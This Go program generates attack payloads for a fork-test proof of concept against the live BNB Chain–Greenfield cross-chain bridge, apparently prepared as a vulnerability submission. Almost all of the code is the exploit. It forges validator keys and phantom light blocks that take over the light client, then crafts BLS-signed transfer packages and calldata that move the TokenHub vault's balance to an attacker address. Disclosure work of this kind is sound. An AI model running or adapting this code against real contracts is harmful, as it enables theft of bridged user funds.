// Command gfpayload is the GF-V1 Stage-11 attack-payload generator.
//
// It reads the fresh mainnet anchor (reanchor.json, produced by
// scripts/s11_reanchor.py against https://bsc-dataseed.bnbchain.org) and
// emits test/payloads.json containing every byte the Foundry fork PoC needs:
//
//   - the collusion simulation material (two deterministic ed25519 "colluder"
//     validator keys that will replace validators #0/#1 of the LIVE tracked
//     set via vm.store in the Foundry test — modeling possession of 50% of
//     the voting power),
//   - the attacker successor validator set (entries #0/#1 reuse the colluder
//     consensus keys, paired with attacker BLS keys and attacker relayers),
//   - the phantom cometbft LightBlocks at gnfdHeight+2 (skip path, main),
//     gnfdHeight+1 (adjacent-path control) and the single-colluder variant,
//   - the forged TransferInSynPackages with aggregate BLS signatures,
//   - the exact precompile-0x67 inputs and every expected value.
//
// All key material is deterministic (seeded), so re-running reproduces
// byte-identical payloads for the same reanchor.json.
package main

import (
        "bytes"
        "crypto/ed25519"
        "crypto/sha256"
        "encoding/binary"
        "encoding/hex"
        "encoding/json"
        "fmt"
        "math/big"
        "os"
        "strconv"
        "strings"
        "time"

        cmted25519 "github.com/cometbft/cometbft/crypto/ed25519"
        cmtbytes "github.com/cometbft/cometbft/libs/bytes"
        cmtpversion "github.com/cometbft/cometbft/proto/tendermint/version"
        tmproto "github.com/cometbft/cometbft/proto/tendermint/types"
        tmtypes "github.com/cometbft/cometbft/types"
        cmtversion "github.com/cometbft/cometbft/version"
        "github.com/ethereum/go-ethereum/accounts/abi"
        "github.com/ethereum/go-ethereum/common"
        "github.com/ethereum/go-ethereum/crypto"
        "github.com/prysmaticlabs/prysm/v5/crypto/bls"
)

// ---------------------------------------------------------------------------
// addresses (live mainnet, from reanchor)
// ---------------------------------------------------------------------------

var (
        addrCrossChain = common.HexToAddress("0x77e719b714be09F70D484AB81F70D02B0E182f7d")
        addrLightCl    = common.HexToAddress("0x433bB48Bd86c089375e53b2E2873A9C4bC0e986B")
        addrTokenHub   = common.HexToAddress("0xeA97dF87E6c7F68C9f95A69dA79E19B834823F25")
        addrRelayerHub = common.HexToAddress("0x31C477F05CE58bB81A9FB4b8c00560f1cBe185d1")

        addrAttacker = common.HexToAddress("0x5151515151515151515151515151515151515151")

        attRelayers = [4]common.Address{
                common.HexToAddress("0x6601000000000000000000000000000000000001"),
                common.HexToAddress("0x6602000000000000000000000000000000000002"),
                common.HexToAddress("0x6603000000000000000000000000000000000003"),
                common.HexToAddress("0x6604000000000000000000000000000000000004"),
        }
)

const (
        relayFeeWei int64 = 25_000_000_000_000  // payload relayFee, mirrors the executed Go harness
        marginWei   int64 = 1_000_000_000_000_000 // drained-vault margin, mirrors the executed Go harness
        gnfdChainID = uint16(1017)
)

// ---------------------------------------------------------------------------
// validator material
// ---------------------------------------------------------------------------

type val struct {
        name    string
        edPriv  ed25519.PrivateKey
        edPub   []byte // 32B
        addr    []byte // 20B = SHA256(edPub)[:20]
        relayer common.Address
        blsSk   bls.SecretKey
        power   int64
}

func (v *val) blsPub() []byte { return v.blsSk.PublicKey().Marshal() }

func makeVal(name string, edSeed, blsSeed []byte, relayer common.Address, power int64) val {
        priv := ed25519.NewKeyFromSeed(edSeed)
        pub := make([]byte, 32)
        copy(pub, priv.Public().(ed25519.PublicKey))
        sk, err := bls.SecretKeyFromBytes(blsSeed)
        if err != nil {
                panic(fmt.Sprintf("bls key %s: %v", name, err))
        }
        h := sha256.Sum256(pub)
        return val{name: name, edPriv: priv, edPub: pub, addr: h[:20], relayer: relayer, blsSk: sk, power: power}
}

func (v *val) tmValidator() *tmtypes.Validator {
        pk := cmted25519.PubKey(append([]byte(nil), v.edPub...))
        tv := tmtypes.NewValidator(pk, v.power)
        tv.SetRelayerAddress(v.relayer.Bytes())
        tv.SetBlsKey(v.blsPub())
        return tv
}

func setHash(vals []val) []byte {
        tvs := make([]*tmtypes.Validator, len(vals))
        for i := range vals {
                tvs[i] = vals[i].tmValidator()
        }
        vs := &tmtypes.ValidatorSet{Validators: tvs, Proposer: tvs[0]}
        return vs.Hash()
}

// encodeConsensusState mirrors v2.EncodeConsensusState:
// chainID 32B | height 8B BE | nextValidatorSetHash 32B |
// N x [pubKey 32 | votingPower 8 BE | relayerAddress 20 | relayerBlsKey 48]
func encodeConsensusState(chainID string, height uint64, nextHash []byte, vals []val) []byte {
        buf := make([]byte, 72+108*len(vals))
        copy(buf[0:32], []byte(chainID))
        binary.BigEndian.PutUint64(buf[32:40], height)
        copy(buf[40:72], nextHash)
        for i := range vals {
                off := 72 + 108*i
                copy(buf[off:off+32], vals[i].edPub)
                binary.BigEndian.PutUint64(buf[off+32:off+40], uint64(vals[i].power))
                copy(buf[off+40:off+60], vals[i].relayer.Bytes())
                copy(buf[off+60:off+108], vals[i].blsPub())
        }
        return buf
}

// buildPhantomLightBlock builds a cometbft LightBlock (fork v0.37 proto) at
// `height` with `newSet` as Validators AND NextValidators; the commit is signed
// by every newSet member whose index is in `signers` (ed25519 over the
// canonical VoteSignBytes).
func buildPhantomLightBlock(chainID string, ts uint64, height uint64, newSet []val, signers map[int]bool) ([]byte, []byte) {
        tvs := make([]*tmtypes.Validator, len(newSet))
        for i := range newSet {
                tvs[i] = newSet[i].tmValidator()
        }
        vs := &tmtypes.ValidatorSet{Validators: tvs, Proposer: tvs[0]}
        valSetHash := vs.Hash()

        h := &tmtypes.Header{
                Version:            cmtpversion.Consensus{Block: cmtversion.BlockProtocol, App: 0},
                ChainID:            chainID,
                Height:             int64(height),
                Time:               time.Unix(int64(ts), 0).UTC(),
                LastBlockID:        tmtypes.BlockID{},
                LastCommitHash:     cmtbytes.HexBytes(crypto.Keccak256([]byte("s11-last-commit"))),
                DataHash:           cmtbytes.HexBytes(crypto.Keccak256([]byte("s11-data"))),
                ValidatorsHash:     cmtbytes.HexBytes(valSetHash),
                NextValidatorsHash: cmtbytes.HexBytes(valSetHash),
                ConsensusHash:      cmtbytes.HexBytes(crypto.Keccak256([]byte("s11-consensus"))),
                AppHash:            cmtbytes.HexBytes(crypto.Keccak256([]byte("s11-app"))),
                LastResultsHash:    cmtbytes.HexBytes(crypto.Keccak256([]byte("s11-results"))),
                EvidenceHash:       cmtbytes.HexBytes(crypto.Keccak256([]byte("s11-evidence"))),
                ProposerAddress:    append([]byte(nil), tvs[0].Address...),
        }
        hdrHash := h.Hash()
        blockID := tmtypes.BlockID{
                Hash:          hdrHash,
                PartSetHeader: tmtypes.PartSetHeader{Total: 1, Hash: cmtbytes.HexBytes(crypto.Keccak256([]byte("s11-partset")))},
        }
        commit := &tmtypes.Commit{
                Height:     int64(height),
                Round:      0,
                BlockID:    blockID,
                Signatures: make([]tmtypes.CommitSig, len(newSet)),
        }
        t := time.Unix(int64(ts), 0).UTC()
        for i := range newSet {
                commit.Signatures[i] = tmtypes.CommitSig{
                        BlockIDFlag:      tmtypes.BlockIDFlagCommit,
                        ValidatorAddress: append([]byte(nil), tvs[i].Address...),
                        Timestamp:        t,
                }
        }
        for i, v := range newSet {
                if !signers[i] {
                        continue
                }
                sb := commit.VoteSignBytes(chainID, int32(i))
                commit.Signatures[i].Signature = ed25519.Sign(v.edPriv, sb)
        }

        lb := &tmtypes.LightBlock{
                SignedHeader: &tmtypes.SignedHeader{Header: h, Commit: commit},
                ValidatorSet: vs,
        }
        lbpb, err := lb.ToProto()
        if err != nil {
                panic(err)
        }
        bz, err := lbpb.Marshal()
        if err != nil {
                panic(err)
        }
        return bz, valSetHash
}

// ---------------------------------------------------------------------------
// payload forging (mirrors the executed Go harness exactly)
// ---------------------------------------------------------------------------

// forgeTransferInPayload builds the exact _checkPayload wire format:
// src[0:2] dst[2:4] ch[4] seq[5:13] type[13] time[14:22] relayFee[22:54]
// ackRelayFee[54:86] load[86:] with load = abi.encode(amount, recipient, refundAddr)
func forgeTransferInPayload(seq uint64, eventTime uint64, amount *big.Int, recipient, refundAddr common.Address) []byte {
        loadA, _ := abi.JSON(strings.NewReader(`[{"name":"x","type":"function","inputs":[],"outputs":[{"name":"amount","type":"uint256"},{"name":"recipient","type":"address"},{"name":"refundAddr","type":"address"}],"stateMutability":"pure"}]`))
        packed, err := loadA.Methods["x"].Outputs.Pack(amount, recipient, refundAddr)
        if err != nil {
                panic(err)
        }
        p := make([]byte, 86+len(packed))
        binary.BigEndian.PutUint16(p[0:2], gnfdChainID) // srcChainId == gnfdChainId (live: 1017)
        binary.BigEndian.PutUint16(p[2:4], 56)         // dstChainId == BSC mainnet
        p[4] = 1                                       // channelId = TRANSFER_IN_CHANNEL_ID
        binary.BigEndian.PutUint64(p[5:13], seq)
        p[13] = 0x00 // packageType = SYN_PACKAGE
        binary.BigEndian.PutUint64(p[14:22], eventTime)
        fee := big.NewInt(relayFeeWei)
        copy(p[22:54], common.LeftPadBytes(fee.Bytes(), 32))
        copy(p[54:86], make([]byte, 32)) // ackRelayFee = 0
        copy(p[86:], packed)
        return p
}

// aggSign signs keccak256(payload) with the attacker set's BLS keys (indices
// in `signers`) and returns (signature, bitSet).
func aggSign(payload []byte, set []val, signers []int) ([]byte, *big.Int) {
        msg := crypto.Keccak256(payload)
        sigs := make([]bls.Signature, 0, len(signers))
        bitSet := new(big.Int)
        for _, i := range signers {
                sigs = append(sigs, set[i].blsSk.Sign(msg))
                bitSet.SetBit(bitSet, i, 1)
        }
        agg := bls.AggregateSignatures(sigs)
        return agg.Marshal(), bitSet
}

func precompile067Input(csBytes, lightBlock []byte) []byte {
        l := make([]byte, 32)
        binary.BigEndian.PutUint64(l[24:32], uint64(len(csBytes)))
        return append(append(l, csBytes...), lightBlock...)
}

func hexOf(b []byte) string { return "0x" + hex.EncodeToString(b) }

func sha256Sum(s string) []byte {
        h := sha256.Sum256([]byte(s))
        return h[:]
}

func dirOf(p string) string {
        for i := len(p) - 1; i >= 0; i-- {
                if p[i] == '/' {
                        return p[:i]
                }
        }
        return "."
}

// ---------------------------------------------------------------------------
// anchor parsing
// ---------------------------------------------------------------------------

func pathGet(raw []byte, dotted string) interface{} {
        var m map[string]interface{}
        if err := json.Unmarshal(raw, &m); err != nil {
                panic(err)
        }
        cur := m
        parts := strings.Split(dotted, ".")
        for i, part := range parts {
                v, ok := cur[part]
                if !ok {
                        for k, vv := range cur {
                                if strings.HasPrefix(k, part+"[") {
                                        v, ok = vv, true
                                        break
                                }
                        }
                        if !ok {
                                panic("missing " + dotted)
                        }
                }
                if i == len(parts)-1 {
                        return v
                }
                cur, ok = v.(map[string]interface{})
                if !ok {
                        panic("not a map at " + dotted)
                }
        }
        return nil
}

func mustHex(s string) []byte {
        s = strings.TrimPrefix(strings.TrimSpace(fmt.Sprintf("%v", s)), "0x")
        if s == "" {
                return nil
        }
        if len(s)%2 == 1 {
                s = "0" + s
        }
        b, err := hex.DecodeString(s)
        if err != nil {
                panic(fmt.Sprintf("bad hex: %v", err))
        }
        return b
}

func mustParseUint(v interface{}) uint64 {
        switch x := v.(type) {
        case float64:
                return uint64(x)
        case string:
                s := strings.Trim(strings.TrimSpace(x), "\"")
                s = strings.TrimPrefix(s, "0x")
                if u, err := strconv.ParseUint(s, 10, 64); err == nil {
                        return u
                }
                u, err := strconv.ParseUint(s, 16, 64)
                if err != nil {
                        panic(fmt.Sprintf("parse uint %q: %v", s, err))
                }
                return u
        default:
                panic(fmt.Sprintf("cannot parse uint from %T", v))
        }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func mustHexFromIface(v interface{}) []byte {
        return mustHex(fmt.Sprintf("%v", v))
}

func main() {
        anchorPath := os.Getenv("GF_ANCHOR")
        if anchorPath == "" {
                anchorPath = "/home/z/my-project/download/bnb_submission_gfv1_final/reanchor.json"
        }
        outPath := os.Getenv("GF_OUT")
        if outPath == "" {
                outPath = "/home/z/my-project/download/bnb_submission_gfv1_final/bnb_submission_gfv1_foundry/test/payloads.json"
        }

        raw, err := os.ReadFile(anchorPath)
        if err != nil {
                panic(err)
        }

        csReal := mustHexFromIface(pathGet(raw, "lightClient.consensusStateBytes"))
        var valsJSON []map[string]interface{}
        if err := json.Unmarshal(mustMarshal(pathGet(raw, "lightClient.validatorSet")), &valsJSON); err != nil {
                panic(err)
        }
        if len(csReal) != 72+108*len(valsJSON) {
                panic(fmt.Sprintf("consensusStateBytes len %d inconsistent with %d validators", len(csReal), len(valsJSON)))
        }
        chainID := strings.TrimRight(string(csReal[0:32]), "\x00")
        h0 := binary.BigEndian.Uint64(csReal[32:40])
        execTs := mustParseUint(pathGet(raw, "meta.blockTimestamp"))
        anchorBlock := mustParseUint(pathGet(raw, "meta.blockNumber"))
        anchorHash := fmt.Sprintf("%v", pathGet(raw, "meta.blockHash"))
        realRelayer0 := common.HexToAddress(fmt.Sprintf("%v", valsJSON[0]["relayerAddress"]))

        recv1 := mustParseUint(pathGet(raw, "crossChain.channelReceiveSequenceMap[1]"))
        balance := new(big.Int)
        balance.SetString(fmt.Sprintf("%v", pathGet(raw, "tokenHub.balanceWei")), 10)

        fmt.Printf("anchor block %d (%s) ts %d\n", anchorBlock, anchorHash, execTs)
        fmt.Printf("chainID=%q H0=%d vals=%d recv1=%d balance=%s\n",
                chainID, h0, len(valsJSON), recv1, balance)

        // ---- deterministic key material ------------------------------------
        var colluders [2]val
        for i := 0; i < 2; i++ {
                seed := sha256Sum(fmt.Sprintf("s11-colluder-%d", i))
                blsSeed := bytes.Repeat([]byte{byte(0x51 + i)}, 32)
                colluders[i] = makeVal(fmt.Sprintf("colluder%d", i), seed, blsSeed, attRelayers[i], 1000)
        }

        // attacker successor set: entries 0/1 reuse the two colluders' ed25519
        // consensus keys (so their commit signatures satisfy the trusting check
        // against the patched tracked set) but pair them with ATTACKER BLS keys
        // and ATTACKER relayers; entries 2/3 are fully attacker-controlled.
        var attSet [4]val
        for i := 0; i < 2; i++ {
                attSet[i] = makeVal(fmt.Sprintf("colluder%d-ed-attacker-bls", i),
                        append([]byte(nil), colluders[i].edPub...), bytes.Repeat([]byte{byte(0x61 + i)}, 32), attRelayers[i], 1000)
                attSet[i].edPriv = colluders[i].edPriv
                attSet[i].edPub = append([]byte(nil), colluders[i].edPub...)
                attSet[i].addr = append([]byte(nil), colluders[i].addr...)
        }
        {
                seed2 := sha256Sum("s11-attacker-2")
                seed3 := sha256Sum("s11-attacker-3")
                attSet[2] = makeVal("attacker2", seed2, bytes.Repeat([]byte{0x63}, 32), attRelayers[2], 1000)
                attSet[3] = makeVal("attacker3", seed3, bytes.Repeat([]byte{0x64}, 32), attRelayers[3], 1000)
        }

        // patched consensus states: the collusion simulations. "patched" =
        // validators #0/#1 of the LIVE set have their ed25519 consensus pubkeys
        // replaced by the colluder pubkeys (50% of the voting power — the attack
        // scenario); "patchedSingle" = only validator #0 is replaced (25% — the
        // single-colluder control).
        csPatched := append([]byte(nil), csReal...)
        for i := 0; i < 2; i++ {
                copy(csPatched[72+108*i:72+108*i+32], colluders[i].edPub)
        }
        csPatchedSingle := append([]byte(nil), csReal...)
        copy(csPatchedSingle[72:72+32], colluders[0].edPub)

        // ---- phantom light blocks ------------------------------------------
        // All blocks are fully signed by the 4 successor-set members; the only
        // variable across main/adjacent is the height (H0+2 skip vs H0+1
        // adjacent-pinning control). The single-colluder power control reuses the
        // main block against a tracked set holding only ONE colluder key.
        allSigners := map[int]bool{0: true, 1: true, 2: true, 3: true}
        lbMain, attSetHash := buildPhantomLightBlock(chainID, execTs, h0+2, attSet[:], allSigners)
        lbAdjacent, _ := buildPhantomLightBlock(chainID, execTs, h0+1, attSet[:], allSigners)

        // precompile-0x67 input for the main attack (for oracle + bridge checks)
        pc067Main := precompile067Input(csPatched, lbMain)

        // ---- drain packages -------------------------------------------------
        pkg1Amt := new(big.Int).Mul(big.NewInt(999), big.NewInt(1e18)) // below largeTransferLimit
        // pkg2 takes everything left AFTER pkg1's payout (999e18) and its relay
        // fee (25e12) leave the vault, minus a 1e15 margin — mirroring the
        // executed Go harness, which read the post-package-1 balance.
        pkg2Amt := new(big.Int).Sub(
                new(big.Int).Sub(new(big.Int).Sub(balance, pkg1Amt), big.NewInt(relayFeeWei)),
                big.NewInt(marginWei)) // above limit -> 12h lock

        type pkgOut struct {
                Seq        uint64 `json:"seq"`
                AmountWei  string `json:"amountWei"`
                Payload    string `json:"payload"`
                BlsSig     string `json:"blsSig"`
                BitSet     string `json:"bitSet"`
                EventTime  uint64 `json:"eventTime"`
                RelayerFee string `json:"relayerFeeWei"`
        }
        mkPkg := func(seq uint64, amount *big.Int) (pkgOut, []byte, []byte) {
                payload := forgeTransferInPayload(seq, execTs-60, amount, addrAttacker, addrAttacker)
                sig, bitSet := aggSign(payload, attSet[:], []int{0, 1, 2, 3})
                return pkgOut{
                        Seq: seq, AmountWei: amount.String(),
                        Payload: hexOf(payload), BlsSig: hexOf(sig), BitSet: bitSet.String(),
                        EventTime: execTs - 60, RelayerFee: fmt.Sprintf("%d", relayFeeWei),
                }, payload, sig
        }
        p1, payload1, sig1 := mkPkg(recv1, pkg1Amt)
        p2, payload2, sig2 := mkPkg(recv1+1, pkg2Amt)

        // 0x66 input for each package (for oracle probes + bridge registration)
        blsIn := func(payload []byte, sig []byte) []byte {
                in := append(append(crypto.Keccak256(payload), sig...), attSet[0].blsPub()...)
                for i := 1; i < 4; i++ {
                        in = append(in, attSet[i].blsPub()...)
                }
                return in
        }
        blsIn1 := blsIn(payload1, sig1)
        blsIn2 := blsIn(payload2, sig2)

        // commit-signature binding hashes (bridge gate material): keccak over the
        // concatenation of every CommitSig.Signature in the marshalled LightBlock.
        sigSetHash := func(lb []byte) string {
                var lbpb tmproto.LightBlock
                if err := lbpb.Unmarshal(lb); err != nil {
                        panic(err)
                }
                var cat []byte
                for i := range lbpb.SignedHeader.Commit.Signatures {
                        cat = append(cat, lbpb.SignedHeader.Commit.Signatures[i].Signature...)
                }
                return hexOf(crypto.Keccak256(cat))
        }

        // expected NEW consensus state after the takeover (what the real 0x67
        // must return and the bridge must reproduce):
        newCS := encodeConsensusState(chainID, h0+2, attSetHash, attSet[:])

        // calldata
        lcABI, err := abi.JSON(strings.NewReader(`[
         {"name":"syncLightBlock","type":"function","inputs":[{"name":"_lightBlock","type":"bytes"},{"name":"_height","type":"uint64"}],"outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable"}]`))
        if err != nil {
                panic(err)
        }
        ccABI, err := abi.JSON(strings.NewReader(`[
         {"name":"handlePackage","type":"function","inputs":[{"name":"_payload","type":"bytes"},{"name":"_blsSignature","type":"bytes"},{"name":"_validatorsBitSet","type":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}]`))
        if err != nil {
                panic(err)
        }
        syncCalldata, err := lcABI.Pack("syncLightBlock", lbMain, h0+2)
        if err != nil {
                panic(err)
        }
        hp1Calldata, err := ccABI.Pack("handlePackage", payload1, sig1, big.NewInt(0xF))
        if err != nil {
                panic(err)
        }
        hp2Calldata, err := ccABI.Pack("handlePackage", payload2, sig2, big.NewInt(0xF))
        if err != nil {
                panic(err)
        }

        // ---- write payloads.json -------------------------------------------
        out := map[string]interface{}{
                "meta": map[string]interface{}{
                        "anchorFile":          anchorPath,
                        "anchorBlock":         anchorBlock,
                        "anchorHash":          anchorHash,
                        "execTimestamp":       execTs,
                        "chainID":             chainID,
                        "gnfdHeightH0":        h0,
                        "skipHeight":          h0 + 2,
                        "adjacentHeight":      h0 + 1,
                        "recvSequenceCh1":     recv1,
                        "tokenHubBalanceWei":  balance.String(),
                        "relayFeeWei":         relayFeeWei,
                        "marginWei":           marginWei,
                        "withdrawWarpSeconds": 43201,
                        "realRelayer0":        realRelayer0.Hex(),
                },
                "colluders": []map[string]interface{}{
                        {
                                "index": 0, "name": "colluder0",
                                "edSeed": hexOf(sha256Sum("s11-colluder-0")),
                                "pubKey": hexOf(colluders[0].edPub),
                                "addr":   hexOf(colluders[0].addr),
                                "replacesValidator": 0,
                        },
                        {
                                "index": 1, "name": "colluder1",
                                "edSeed": hexOf(sha256Sum("s11-colluder-1")),
                                "pubKey": hexOf(colluders[1].edPub),
                                "addr":   hexOf(colluders[1].addr),
                                "replacesValidator": 1,
                        },
                },
                "attackerSet": []map[string]interface{}{
                        {"name": "colluder0-ed+attackerBls", "pubKey": hexOf(attSet[0].edPub), "power": 1000, "relayer": attRelayers[0].Hex(), "blsPubKey": hexOf(attSet[0].blsPub())},
                        {"name": "colluder1-ed+attackerBls", "pubKey": hexOf(attSet[1].edPub), "power": 1000, "relayer": attRelayers[1].Hex(), "blsPubKey": hexOf(attSet[1].blsPub())},
                        {"name": "attacker2", "pubKey": hexOf(attSet[2].edPub), "power": 1000, "relayer": attRelayers[2].Hex(), "blsPubKey": hexOf(attSet[2].blsPub())},
                        {"name": "attacker3", "pubKey": hexOf(attSet[3].edPub), "power": 1000, "relayer": attRelayers[3].Hex(), "blsPubKey": hexOf(attSet[3].blsPub())},
                },
                "attacker":  map[string]interface{}{"eoa": addrAttacker.Hex(), "relayer": attRelayers[0].Hex()},
                "addresses": map[string]interface{}{
                        "crossChain": addrCrossChain.Hex(), "lightClient": addrLightCl.Hex(),
                        "tokenHub": addrTokenHub.Hex(), "relayerHub": addrRelayerHub.Hex(),
                },
                "lightBlocks": map[string]interface{}{
                        "main":            map[string]string{"bytes": hexOf(lbMain), "height": fmt.Sprintf("%d", h0+2), "sigSetHash": sigSetHash(lbMain)},
                        "adjacent":        map[string]string{"bytes": hexOf(lbAdjacent), "height": fmt.Sprintf("%d", h0+1), "sigSetHash": sigSetHash(lbAdjacent)},
                },
                "consensusState": map[string]interface{}{
                        "real":                   hexOf(csReal),
                        "patched":                hexOf(csPatched),
                        "patchedSingle":          hexOf(csPatchedSingle),
                        "expectedNewAfterSync":   hexOf(newCS),
                        "attackerSetHash":        hexOf(attSetHash),
                },
                "precompile067InputMain": hexOf(pc067Main),
                "packages":               []pkgOut{p1, p2},
                "blsVerifyInputs": map[string]interface{}{
                        "package1": hexOf(blsIn1),
                        "package2": hexOf(blsIn2),
                },
                "calldata": map[string]interface{}{
                        "syncLightBlock": hexOf(syncCalldata),
                        "handlePackage1": hexOf(hp1Calldata),
                        "handlePackage2": hexOf(hp2Calldata),
                },
                "expected": map[string]interface{}{
                        "heightAfterSync":         h0 + 2,
                        "package1PayoutWei":       pkg1Amt.String(),
                        "package2LockWei":         pkg2Amt.String(),
                        "attackerFinalBalanceWei": new(big.Int).Add(pkg1Amt, pkg2Amt).String(),
                        "tokenHubResidualWei":     new(big.Int).Sub(big.NewInt(marginWei), big.NewInt(relayFeeWei)).String(),
                        "relayerHubHoldingWei":    fmt.Sprintf("%d", 2*relayFeeWei),
                },
        }

        os.MkdirAll(dirOf(outPath), 0755)
        blob, _ := json.MarshalIndent(out, "", "  ")
        if err := os.WriteFile(outPath, blob, 0644); err != nil {
                panic(err)
        }
        fmt.Printf("wrote %s (%d bytes)\n", outPath, len(blob))
        fmt.Printf("colluder pubs: %s / %s\n", hexOf(colluders[0].edPub)[:26], hexOf(colluders[1].edPub)[:26])
        fmt.Printf("attacker set hash: %s\n", hexOf(attSetHash))
}

func mustMarshal(v interface{}) []byte {
        b, err := json.Marshal(v)
        if err != nil {
                panic(err)
        }
        return b
}
